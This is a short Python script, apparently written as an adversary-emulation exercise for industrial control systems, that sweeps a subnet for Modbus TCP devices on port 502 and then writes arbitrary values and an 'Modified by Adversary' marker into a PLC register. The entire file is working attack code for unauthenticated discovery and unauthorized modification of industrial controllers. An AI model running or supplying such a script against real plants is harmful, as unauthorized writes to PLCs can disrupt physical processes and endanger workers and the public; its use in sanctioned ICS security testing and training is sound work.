from pymodbus.client.sync import ModbusTcpClient
import ipaddress

# Variables based on the scenario
SUBNET = "192.168.9.0/24"  # Subnet to scan
PLC_PORT = 502             # Default Modbus TCP port
PLC_REGISTER = 0x4000      # Example register to simulate program modification
MOD_PROGRAM_MARKER = "Modified by Adversary"  # Example program modification marker

# Function to scan the network for the PLC
def find_plc_ip(subnet):
    print("[+] Scanning subnet for PLC...")
    for ip in ipaddress.IPv4Network(subnet):
        str_ip = str(ip)
        client = ModbusTcpClient(str_ip, port=PLC_PORT)
        try:
            if client.connect():
                # Attempt to read a known register to verify it's a PLC
                response = client.read_holding_registers(0, 1, unit=1)
                if response.isError():
                    print(f"[-] {str_ip} responded but is not a PLC.")
                else:
                    print(f"[+] PLC found at {str_ip}")
                    client.close()
                    return str_ip
            else:
                print(f"[-] No response from {str_ip}")
        except Exception as e:
            print(f"[!] Error connecting to {str_ip}: {e}")
        finally:
            client.close()
    return None

# Function to modify the program on the PLC
def modify_plc_program(plc_ip):
    client = ModbusTcpClient(plc_ip, port=PLC_PORT)
    try:
        if client.connect():
            print(f"[+] Connected to PLC at {plc_ip}")
            # Example Write Operation: Modify a program-specific register
            # (This assumes you know the internal memory address for program storage in the PLC)
            result = client.write_register(PLC_REGISTER, 0xFFFF, unit=1)  # Example modification
            if result.isError():
                print("[-] Failed to modify PLC program.")
            else:
                print("[+] Successfully modified the PLC program.")
                # Optionally write a marker or versioning info: This simulates adding a custom signature
                client.write_registers(PLC_REGISTER, [ord(c) for c in MOD_PROGRAM_MARKER], unit=1)
                print(f"[+] Added program marker: {MOD_PROGRAM_MARKER}")
    except Exception as e:
        print(f"[!] Error during modification: {e}")
    finally:
        client.close()

if __name__ == "__main__":
    # Find the PLC's IP first
    plc_ip = find_plc_ip(SUBNET)
    if plc_ip:
        # If PLC is found, attempt to modify its program
        modify_plc_program(plc_ip)
    else:
        print("[-] No PLC found on the subnet.")